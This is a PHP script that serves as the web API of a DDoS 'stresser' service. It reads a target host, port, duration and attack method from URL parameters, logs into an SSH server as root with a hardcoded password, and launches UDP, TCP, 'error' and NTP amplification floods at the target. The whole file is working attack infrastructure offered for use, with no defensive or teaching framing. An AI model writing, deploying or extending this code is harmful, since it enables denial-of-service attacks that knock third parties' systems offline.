<?php

/*
*
*	Modification of the original SSH2 API Attack Script
*
*	Created by Nathan (0x68) for Network Stressing, LLC
*
*/

// Server Connection Information
define("SSH_IP", "127.0.0.1");
define("SSH_PORT", "22");
define("SSH_USER", "root");
define("SSH_PASSWORD", "kimtot123");

// Threads you want per attack
define("ATTACK_THREADS", 1);

// Set the PHP Load time to 0 (So it doesn't timeout after a certain time)
set_time_limit(0);

// Make it so you cannot stop the script. Once it has been executed, you cannot stop it
ignore_user_abort(true);

// Website IP Lock (Incase the API gets leaked)
//if($_SERVER['REMOTE_ADDR'] != "113.53.200.29") die("You're not authorized to use this API.");

// Is all the parameters set?
if(empty($_GET['host']) || empty($_GET['port']) || empty($_GET['time']) || empty($_GET['method'])) die("You're missing some paramters.");

// Store the information into a specific variable
$host = escapeshellcmd($_GET['host']);
$port = escapeshellcmd($_GET['port']);
$time = escapeshellcmd($_GET['time']);
$method = escapeshellcmd($_GET['method']);

// Is the SSH2 Dependency installed?
if(!function_exists("ssh2_connect")) die("Please install the SSH2 Dependency on the Linux Server First.");

if(!($con = ssh2_connect(SSH_IP, SSH_PORT))) die("Could not connect to SSH...");
else
{
	if(!ssh2_auth_password($con, SSH_USER, SSH_PASSWORD)) die("Invalid Credentials...\n");
    else
    {
    	if($method == "UDP" || $method == "udp")
    	{
	        if(!($stream = ssh2_exec($con, "perl test.pl ".$host." ".$port." 1500 ".$time))) die("Command couldn't be executed, something went wrong...\n");
	        else
	        {
	            echo "" . stream_get_contents($stream);
	            echo "The attack has successfully been sent...";
	        }
	    }
	    elseif($method == "TCP" || $method == "tcp")
    	{
	        if(!($stream = ssh2_exec($con, "./google ".$host." ".$port." 500 500 500 ".$time))) die("Command couldn't be executed, something went wrong...\n");
	        else
	        {
	            echo "" . stream_get_contents($stream);
	            echo "The attack has successfully been sent...";
	        }
	    }
	    elseif($method == "ERROR" || $method == "error")
    	{
	        if(!($stream = ssh2_exec($con, "./error ".$host." ".$port." ".$time))) die("Command couldn't be executed, something went wrong...\n");
	        else
	        {
	            echo "" . stream_get_contents($stream);
	            echo "The attack has successfully been sent...";
	        }
	    }
	    elseif($method == "NTP" || $method == "ntp")
    	{
	        if(!($stream = ssh2_exec($con, "/root/ntp ".$host." ".$port." ".$list." ".ATTACK_THREADS." -1 ".$time))) die("Command couldn't be executed, something went wrong...\n");
	        else
	        {
	            echo "" . stream_get_contents($stream);
	            echo "The attack has successfully been sent...";
	        }
	    }
	    else die("That is not a valid method.");
    }

}

?>
